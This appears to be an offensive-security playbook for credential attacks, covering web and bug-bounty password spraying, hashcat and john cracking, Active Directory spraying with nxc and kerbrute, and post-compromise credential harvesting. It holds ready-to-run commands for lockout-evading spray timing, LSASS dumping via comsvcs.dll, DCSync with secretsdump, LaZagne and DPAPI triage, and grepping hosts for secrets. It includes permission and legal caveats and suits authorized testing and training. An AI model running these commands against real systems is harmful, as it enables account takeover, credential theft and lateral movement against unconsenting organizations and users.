# Moraa — Credential Access (crack · spray · harvest)

> Consolidated cred workflows. Hash → identify → crack; users → spray; hosts → harvest.
> §0 is the web/bug-bounty pipeline (own accounts, program-permitted programs only); §1-4 are
> AD/internal (post-foothold). Cross-ref [[validate]] for the 7-Question Gate on any spray hit.

## 0. Web / bug-bounty credential spray

**Run only when program policy explicitly permits credential testing.** Silent on the topic =
assume disallowed, ask first. A spray-only finding is usually rejected standalone ("bad password
choice, not our bug") — the payout is the chain: **spray finds valid creds → re-hunt authenticated
→ IDOR/business-logic bug behind the login wall → report "ATO via spray + IDOR" together.**

**Pipeline:** company-vocabulary wordlist → HIBP-rank it → real usernames (OSINT) → spray.

```bash
# 1. Wordlist-gen — crawl the target site, mutate with hashcat rules
cewl -d 2 -m 5 https://target.com -w recon/words.txt        # or cewler (faster, Scrapy-backed on JS-heavy sites)
hashcat --stdout recon/words.txt -r /usr/share/hashcat/rules/best66.rule | sort -u > recon/candidates.txt
# best66 = balanced default. top10_2025 for a cautious/paranoid program. OneRuleToRuleThemAll
# generates too many candidates for live spray — offline cracking only.

# 2. HIBP breach-count ranking (k-anonymity: only first 5 SHA-1 chars leave your machine, free, no key)
# rank each candidate by real-world breach count, then spray the SWEET SPOT, not the extremes:
#   0            -> never leaked; could be company-specific OR truly random, keep but low-priority
#   1-1,000      -> SWEET SPOT: proven human-picked, not yet in every attacker's default list — PRIORITIZE
#   1,000-1M     -> mainstream, usually already tried by prior attackers
#   >1,000,000   -> generic (password/123456) — skip, every WAF/detection already expects these

# 3. Real usernames — OSINT, don't guess
theHarvester -d target.com -b duckduckgo,crtsh,certspotter,otx -f recon/harvest   # emails + CT-log hostnames
# derive usernames from email local-parts, expand format variants (username-anarchy or by hand)
# 0 emails is common on mature/non-English-named targets — the CT-log hostnames are the consolation
# prize, feed them back into recon.md §1, don't force this stage.

# 4. Spray — LOW AND SLOW, spray order not brute order
```

**Spray order (the part that prevents lockout):** `pass[i] × all_users` per round, never
`user × all_passwords`. Each user takes at most 1 failed attempt per round — stays under typical
5-10/window lockout thresholds (Azure AD/Okta smart lockout: 10 failed in a 10-min sliding window).
Default `--delay 1800 --jitter 60` (30 min/round ± 60s). Faster only with explicit program
permission — against O365 it almost certainly trips smart lockout.

**Success detection (http-form mode)** — check in this order, always supply a fail-regex:
1. `--success-regex` matches response body → success.
2. `--fail-regex` set AND body does NOT match → success.
3. 3xx redirect to a path that isn't the login page → success (heuristic — **false-positive risk**
   on sites that always redirect; never rely on this alone in production, always pair with #2).

**Legal red line:** HIBP hash-prefix is the only legally clean leak-source — plaintext breach-dump
passwords (DeHashed-style) against live accounts is illegal in most jurisdictions even within BB
scope. Stop on first valid-cred hit (don't grind for more — that's not testing). If lockouts likely
happened, notify the program immediately with timestamps.

## 1. Identify the hash

```bash
hashid 'HASH'                  # or:  nth --text 'HASH'   (name-that-hash)
```

### hashcat mode quick table (the ones you'll actually use)

| Mode | Hash | Source |
|---|---|---|
| 1000 | NTLM | SAM / secretsdump / LM:NT |
| 1100 | Domain Cached (DCC1) | cached logons |
| 2100 | DCC2 (mscash2) | cached domain creds |
| 3200 | bcrypt `$2*$` | web app DBs |
| 0 / 100 | MD5 / SHA1 | web |
| 1800 | sha512crypt `$6$` | /etc/shadow |
| 500 | md5crypt `$1$` | old /etc/shadow |
| 13100 | Kerberoast TGS `$krb5tgs$23$` | GetUserSPNs |
| 19600/19700 | Kerberoast AES | AES SPN accounts |
| 18200 | AS-REP `$krb5asrep$23$` | GetNPUsers |
| 5600 | NetNTLMv2 | Responder/relay capture |
| 5500 | NetNTLMv1 | downgrade |
| 16500 | JWT (HS256) | web tokens |
| 22000 | WPA-PMKID/EAPOL | wifi |

```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
hashcat -m <mode> hash.txt -a 3 '?u?l?l?l?l?d?d?d!'      # mask if rules fail
john --format=<fmt> --wordlist=rockyou.txt hash.txt      # alt; john --list=formats
```

Tips: try `rockyou` + OneRule first; then company-specific wordlist (cewl/cewler the site),
seasons+year (`Spring2026!`), and creds you already found (reuse is king).

## 2. Spray (you have users, need a valid pass — AD/internal; web target → §0 above)

```bash
# Build user list (AD)
nxc smb DC_IP -u USER -p PASS --users | awk '{print $5}' > users.txt
# Spray — LOW AND SLOW, mind lockout policy (check --pass-pol first!)
nxc smb DC_IP -u users.txt -p 'Season2026!' --continue-on-success
kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Season2026!'
# O365/Okta SSO in front of a web target: trevorspray; WPA-Enterprise/EAP: offensive-wpa-enterprise skill
```

> Always read the password policy and lockout threshold before spraying. One password across
> many users per window — never many passwords per user.

## 3. Harvest (you have a shell/host)

### Linux
```bash
grep -rinE 'password|passwd|secret|api[_-]?key|token' /var/www /opt /home /etc 2>/dev/null
cat ~/.bash_history; ls -la ~/.ssh /home/*/.ssh 2>/dev/null
cat /var/www/**/{.env,config.php,wp-config.php,settings.py} 2>/dev/null
# DB creds → reuse for system/AD
```

### Windows
```cmd
cmdkey /list                                            :: saved creds → runas /savecred
findstr /si password *.txt *.ini *.config *.xml 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   :: autologon
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
type C:\Windows\Panther\Unattend.xml
```
```cmd
.\LaZagne.exe all                                       :: browser/wifi/vault
.\SharpDPAPI.exe triage                                 :: DPAPI creds
```

### Domain / dumps
```bash
# Local SAM
impacket-secretsdump -sam sam.save -system system.save LOCAL
# LSASS dump → parse offline (no mimikatz on box)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\out.dmp full
pypykatz lsa minidump out.dmp
# Domain (DCSync, needs repl rights)
impacket-secretsdump corp.local/USER:PASS@DC_IP -just-dc
nxc smb TARGET -u USER -H NTHASH --sam --lsa --dpapi    # auto where admin
```

## 4. Use what you cracked
- New cred/hash → **re-spray the subnet** (`lateral-movement.md`) and **re-run BloodHound** as
  the new identity — the graph changes.
- Save raw creds to `loot/` only; record "identity → works on → privilege" in `coverage.md`.
- Password reuse + SSH key reuse are the most common escalation/lateral paths — always try found
  creds against other hosts/services first before cracking anything new.
